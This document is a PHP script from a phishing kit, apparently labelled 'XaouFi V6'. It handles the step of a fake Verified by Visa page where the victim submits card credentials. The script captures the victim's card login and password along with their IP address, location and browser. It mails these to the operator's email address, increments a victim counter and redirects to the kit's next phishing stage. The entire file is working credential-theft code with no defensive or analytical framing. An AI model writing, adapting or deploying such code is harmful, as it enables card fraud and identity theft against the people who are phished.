<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');
include('../quotes.php');

$datei = fopen("../logsz/vbv.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/vbv.txt","w");
fwrite($datei, $count);
fclose($datei);

$message =" ".$quote."
[$$$-------------- VBV Info --------------$$$]
Credit Login    :  " . $_POST['cc_login'] . "
Credit Pass     :  " . $_POST['cc_pass'] . "

[$$$------------ Victim Info -------------$$$]
From            :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

[$$$------------ END VBV Info ------------$$$]
";
crypto($message);
include('../settings.php');
$subject = "VBV Info [ ".$nama_negara." - " . $kota . " - " . $ip . " ]";
$headers = "From: XaouFi V6 <ademaya2003@yandex.com>";
mail($pais_email, $subject, $message, $headers);

header("LOCATION: webscrr.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&step=five&time=".md5(gmdate('r')).sha1(gmdate('r')));

?>